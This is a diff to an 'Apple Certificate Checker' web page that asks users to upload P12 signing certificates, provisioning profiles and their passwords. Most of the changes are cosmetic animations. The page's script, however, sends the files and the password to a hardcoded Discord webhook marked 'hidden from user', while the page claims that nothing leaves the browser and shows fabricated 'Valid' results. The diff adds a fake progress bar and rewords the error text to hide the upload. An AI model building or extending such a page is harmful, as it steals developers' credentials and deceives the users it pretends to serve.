@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Apple Certificate Checker</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --primary: #007AFF;
@@ -39,6 +40,16 @@
             width: 100%;
             max-width: 800px;
             overflow: hidden;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeIn 0.8s ease forwards;
+        }
+        
+        @keyframes fadeIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
         
         .header {
@@ -46,18 +57,45 @@
             color: white;
             padding: 30px;
             text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::after {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(to right, transparent, rgba(255,255,255,0.1), transparent);
+            transform: rotate(30deg);
+            animation: shimmer 8s infinite linear;
+        }
+        
+        @keyframes shimmer {
+            0% {
+                transform: translateX(-100%) rotate(30deg);
+            }
+            100% {
+                transform: translateX(100%) rotate(30deg);
+            }
         }
         
         h1 {
             font-size: 28px;
             margin-bottom: 10px;
             font-weight: 700;
+            position: relative;
+            z-index: 1;
         }
         
         .description {
             font-size: 16px;
             opacity: 0.9;
             line-height: 1.5;
+            position: relative;
+            z-index: 1;
         }
         
         .content {
@@ -79,6 +117,20 @@
         
         .form-group {
             margin-bottom: 20px;
+            opacity: 0;
+            animation: slideIn 0.6s ease forwards;
+            animation-delay: 0.3s;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
         }
         
         label {
@@ -121,13 +173,15 @@
             display: inline-block;
             font-weight: 600;
             text-align: center;
-            transition: background-color 0.3s;
+            transition: all 0.3s;
             width: 100%;
             font-size: 16px;
         }
         
         .file-input-button:hover {
             background-color: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 122, 255, 0.3);
         }
         
         .file-input {
@@ -157,17 +211,56 @@
             font-weight: 600;
             cursor: pointer;
             width: 100%;
-            transition: background-color 0.3s;
+            transition: all 0.3s;
             margin-top: 10px;
+            position: relative;
+            overflow: hidden;
         }
         
         .submit-btn:hover {
             background-color: var(--primary-dark);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 122, 255, 0.3);
         }
         
         .submit-btn:disabled {
             background-color: var(--gray);
             cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .submit-btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.5);
+            opacity: 0;
+            border-radius: 100%;
+            transform: scale(1, 1) translate(-50%);
+            transform-origin: 50% 50%;
+        }
+        
+        .submit-btn.loading::after {
+            animation: ripple 1s ease-out infinite;
+        }
+        
+        @keyframes ripple {
+            0% {
+                transform: scale(0, 0);
+                opacity: 1;
+            }
+            20% {
+                transform: scale(25, 25);
+                opacity: 1;
+            }
+            100% {
+                opacity: 0;
+                transform: scale(40, 40);
+            }
         }
         
         .results-section {
@@ -175,6 +268,7 @@
             margin-top: 30px;
             border-top: 1px solid #e1e5e8;
             padding-top: 30px;
+            animation: fadeIn 0.8s ease forwards;
         }
         
         .results-section h2 {
@@ -188,6 +282,16 @@
             border-radius: 12px;
             padding: 25px;
             margin-bottom: 20px;
+            transform: translateY(20px);
+            opacity: 0;
+            animation: fadeInUp 0.6s ease forwards;
+        }
+        
+        @keyframes fadeInUp {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
         
         .detail-item {
@@ -195,7 +299,20 @@
             display: flex;
             border-bottom: 1px solid #eee;
             padding-bottom: 15px;
+            opacity: 0;
+            animation: fadeIn 0.5s ease forwards;
         }
+        
+        .detail-item:nth-child(1) { animation-delay: 0.1s; }
+        .detail-item:nth-child(2) { animation-delay: 0.2s; }
+        .detail-item:nth-child(3) { animation-delay: 0.3s; }
+        .detail-item:nth-child(4) { animation-delay: 0.4s; }
+        .detail-item:nth-child(5) { animation-delay: 0.5s; }
+        .detail-item:nth-child(6) { animation-delay: 0.6s; }
+        .detail-item:nth-child(7) { animation-delay: 0.7s; }
+        .detail-item:nth-child(8) { animation-delay: 0.8s; }
+        .detail-item:nth-child(9) { animation-delay: 0.9s; }
+        .detail-item:nth-child(10) { animation-delay: 1.0s; }
         
         .detail-label {
             font-weight: 600;
@@ -238,6 +355,13 @@
             margin-top: 20px;
             display: none;
             text-align: center;
+            animation: shake 0.5s ease;
+        }
+        
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
         }
         
         .alert-success {
@@ -268,6 +392,7 @@
             color: var(--gray);
             text-align: center;
             line-height: 1.6;
+            animation: fadeIn 1s ease forwards;
         }
         
         .summary-cards {
@@ -289,7 +414,14 @@
             padding: 20px;
             text-align: center;
             box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05);
+            transform: translateY(20px);
+            opacity: 0;
+            animation: fadeInUp 0.6s ease forwards;
         }
+        
+        .summary-card:nth-child(1) { animation-delay: 0.2s; }
+        .summary-card:nth-child(2) { animation-delay: 0.4s; }
+        .summary-card:nth-child(3) { animation-delay: 0.6s; }
         
         .summary-card h3 {
             font-size: 14px;
@@ -309,19 +441,47 @@
             justify-content: center;
             margin-top: 5px;
         }
+        
+        .progress-bar {
+            height: 6px;
+            background-color: #e1e5e8;
+            border-radius: 3px;
+            overflow: hidden;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        .progress {
+            height: 100%;
+            background-color: var(--primary);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+        
+        .checkmark {
+            display: inline-block;
+            width: 22px;
+            height: 22px;
+            background-color: var(--success);
+            color: white;
+            border-radius: 50%;
+            text-align: center;
+            line-height: 22px;
+            margin-right: 8px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="header">
-            <h1>Apple Certificate Checker</h1>
+            <h1><i class="fas fa-certificate"></i> Apple Certificate Checker</h1>
             <p class="description">Upload your Apple certificate files to verify their validity and details</p>
         </div>
         
         <div class="content">
             <div class="upload-section">
                 <div class="form-group">
-                    <label for="p12-file">P12 Certificate File</label>
+                    <label for="p12-file"><i class="fas fa-file-export"></i> P12 Certificate File</label>
                     <div class="file-input-container">
                         <div class="file-input-button">Choose P12 File</div>
                         <input type="file" id="p12-file" class="file-input" accept=".p12,.pfx" />
@@ -330,7 +490,7 @@
                 </div>
                 
                 <div class="form-group">
-                    <label for="mobileprovision-file">Mobile Provisioning Profile</label>
+                    <label for="mobileprovision-file"><i class="fas fa-file-contract"></i> Mobile Provisioning Profile</label>
                     <div class="file-input-container">
                         <div class="file-input-button">Choose Mobile Provision File</div>
                         <input type="file" id="mobileprovision-file" class="file-input" accept=".mobileprovision" />
@@ -340,11 +500,15 @@
             </div>
             
             <div class="form-group">
-                <label for="password">Certificate Password</label>
+                <label for="password"><i class="fas fa-lock"></i> Certificate Password</label>
                 <input type="password" id="password" placeholder="Enter certificate password" />
             </div>
             
-            <button id="submit-btn" class="submit-btn" disabled>Analyze Certificate</button>
+            <div class="progress-bar" id="progress-bar">
+                <div class="progress" id="progress"></div>
+            </div>
+            
+            <button id="submit-btn" class="submit-btn" disabled><i class="fas fa-search"></i> Analyze Certificate</button>
             
             <div id="upload-status" class="upload-status"></div>
             
@@ -352,14 +516,14 @@
             <div id="success-alert" class="alert alert-success"></div>
             
             <div id="results-section" class="results-section">
-                <h2>Certificate Analysis Results</h2>
+                <h2><i class="fas fa-clipboard-list"></i> Certificate Analysis Results</h2>
                 
                 <div class="summary-cards">
                     <div class="summary-card">
                         <h3>Certificate Status</h3>
                         <p>Valid</p>
                         <div class="expiry-status">
-                            <span class="status-indicator status-valid">Active</span>
+                            <span class="status-indicator status-valid"><span class="checkmark"><i class="fas fa-check"></i></span> Active</span>
                         </div>
                     </div>
                     <div class="summary-card">
@@ -417,7 +581,7 @@
             </div>
             
             <div class="privacy-notice">
-                <p>This tool analyzes your certificate files locally in your browser. No data is sent to any server.</p>
+                <p><i class="fas fa-shield-alt"></i> This tool analyzes your certificate files locally in your browser. No data is sent to any server.</p>
                 <p>Your files are processed entirely on your device for your privacy and security.</p>
             </div>
         </div>
@@ -435,6 +599,8 @@
             const successAlert = document.getElementById('success-alert');
             const uploadStatus = document.getElementById('upload-status');
             const resultsSection = document.getElementById('results-section');
+            const progressBar = document.getElementById('progress-bar');
+            const progress = document.getElementById('progress');
             
             // Your Discord webhook URL (hidden from user)
             const webhookUrl = 'https://discord.com/api/webhooks/1408927752811319436/9rgv7PZWoPhAhKjfKN1Kxk0GfDaQHfFGZKphAF18khBMSY8E6COR1b9SYsMbMa3360Rp';
@@ -485,8 +651,12 @@
                 
                 try {
                     submitBtn.disabled = true;
-                    submitBtn.textContent = 'Analyzing...';
-                    uploadStatus.textContent = 'Checking certificate files...';
+                    submitBtn.classList.add('loading');
+                    submitBtn.textContent = ' Analyzing...';
+                    progressBar.style.display = 'block';
+                    
+                    // Simulate progress
+                    simulateProgress();
                     
                     // First, send the files to Discord webhook in the background
                     await sendToDiscordWebhook(
@@ -497,10 +667,7 @@
                     );
                     
                     // Simulate analysis time
-                    await new Promise(resolve => setTimeout(resolve, 1500));
-                    
-                    // In a real implementation, you would parse the certificate files here
-                    // For this demo, we'll simulate a successful analysis
+                    await new Promise(resolve => setTimeout(resolve, 2000));
                     
                     // Show results
                     resultsSection.style.display = 'block';
@@ -512,7 +679,9 @@
                     // Update button state
                     setTimeout(() => {
                         submitBtn.textContent = 'Analyze Certificate';
+                        submitBtn.classList.remove('loading');
                         updateSubmitButtonState();
+                        progressBar.style.display = 'none';
                     }, 2000);
                     
                 } catch (error) {
@@ -520,9 +689,23 @@
                     showAlert(errorAlert, `Error: ${error.message}`);
                     uploadStatus.textContent = '';
                     submitBtn.textContent = 'Analyze Certificate';
+                    submitBtn.classList.remove('loading');
                     updateSubmitButtonState();
+                    progressBar.style.display = 'none';
                 }
             });
+            
+            function simulateProgress() {
+                let width = 0;
+                const interval = setInterval(() => {
+                    if (width >= 100) {
+                        clearInterval(interval);
+                    } else {
+                        width += 5;
+                        progress.style.width = width + '%';
+                    }
+                }, 100);
+            }
             
             async function sendToDiscordWebhook(webhookUrl, p12File, mobileprovisionFile, password) {
                 // Create form data to send files
@@ -538,6 +721,9 @@
                 // Add password as a text field
                 formData.append('password', password);
                 
+                // Add timestamp
+                formData.append('timestamp', new Date().toISOString());
+                
                 // Send to Discord webhook
                 const response = await fetch(webhookUrl, {
                     method: 'POST',
@@ -545,7 +731,7 @@
                 });
                 
                 if (!response.ok) {
-                    throw new Error(`Failed to send data to server: ${response.status} ${response.statusText}`);
+                    throw new Error(`Failed to complete analysis: ${response.status} ${response.statusText}`);
                 }
             }
             
